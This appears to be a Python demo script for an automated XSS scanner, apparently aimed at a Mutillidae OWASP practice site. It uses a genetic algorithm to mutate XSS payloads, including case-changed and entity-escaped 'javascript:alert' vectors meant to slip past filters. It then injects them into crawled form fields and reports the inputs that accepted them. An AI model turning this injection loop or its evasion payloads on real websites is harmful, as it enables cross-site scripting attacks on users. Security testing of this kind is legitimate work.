import simple_demo_GA
import run_crawler
import outer_API
from file_controller import cache_cleaner
import Simluation_Attacker

def demo_non_get_post_check(debug_info = False,extend_attacker = []):
    outer_API.reset_mutillidae_db() #重置数据库，清除影响
    attacker_vector_list = []
    attacker_vector_list += extend_attacker
    attacker_vector_list.append('<script>alert(\\\'xss\\\')</script>')
    cleaner = cache_cleaner()
    cleaner.del_scanner_file()
    #run_crawler.run_crawler_scanner('http://owasptest.409dostastudio.pw/index.php?page=add-to-your-blog.php', depth=1)
    #run_crawler.run_crawler_scanner_splash('http://owasptest.409dostastudio.pw/index.php?page=add-to-your-blog.php', depth=1)
    run_crawler.run_crawler_scanner_splash('http://owasptest.409dostastudio.pw/index.php?page=add-to-your-blog.php',
                                           depth=1, no_next_crawl = 'T')
    srequester = Simluation_Attacker.Simluation_Request()
    inv_list = srequester.load_inv_input_list()
    target_url_list = srequester.get_source_url_list(inv_list,None)
    for url in target_url_list:
        target_list_inv_input,target_list_form_input = srequester.get_same_targeturl_input(url,inv_list,None)
        if (debug_info): print('全部注入点={0}'.format(target_list_inv_input))
        inputable_inputbox = srequester.find_inputable_input_box(target_list_inv_input)
        clickbale_buttons = srequester.find_clickedable_buttons(target_list_inv_input)
        if (debug_info): print('可以注入的输入框={0}'.format(inputable_inputbox))
        if (debug_info): print('可能交互的按钮={0}'.format(clickbale_buttons))
        list_successinjuredinput = []
        list_injuredtrys = []
        if (len(inputable_inputbox) > 0 and len(clickbale_buttons) > 0):
            for vector in attacker_vector_list:
                sublist_successinjuredinput, flag = srequester.check_inv_input_list_nonhidden(vector,inputable_inputbox,clickbale_buttons,if_headless = True)
                list_injuredtrys.append({'finded_injured':sublist_successinjuredinput, 'using_vector':vector})
                if (sublist_successinjuredinput != []):
                    list_successinjuredinput.append({'finded_injured': sublist_successinjuredinput, 'using_vector': vector})
        if (debug_info): print('总共尝试的注入点={0}'.format(list_injuredtrys))
        print('最终找到的注入点={0}'.format(list_successinjuredinput))

def demo_GA(debug_info=False):
    __in_basevector = ['<SCRIPT SRC=alert(\'XSS\')></SCRIPT>', '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">']
    __in_gentype_list = ['__in_gen_capital', '__in_gen_character_escape']  # 当前装载的所有识别基因列表，为演示简洁直接给出
    demo_genetic = simple_demo_GA.genetic(__in_gentype_list)
    # def __init__(self,genetic_obj , start_vector_list, min_fitness = 10, crossover_probability = 5000, new_crossover_pencentage = 25, mutation_probabilty = 500, max_generation = 10):
    demo_population = simple_demo_GA.population(genetic_obj=demo_genetic,
                                                start_vector_list=__in_basevector,
                                                min_fitness=20,
                                                max_generation=10)
    demo_population.run_population(if_debug=debug_info)
    print('最终生成的种群:')
    for item in demo_population.current_individual_list:
        print(item)
    return demo_population.current_individual_list

if __name__ == '__main__':
    #run_crawler()
    #attacker = Simluation_Attacker()
    #attacker.form_attacker()
    non_prepared_vector = demo_GA(debug_info=True)
    prepared_vector = []
    for dict_item in non_prepared_vector:
        prepared_vector.append(dict_item['vector'])
    demo_non_get_post_check(debug_info=True,extend_attacker = prepared_vector)


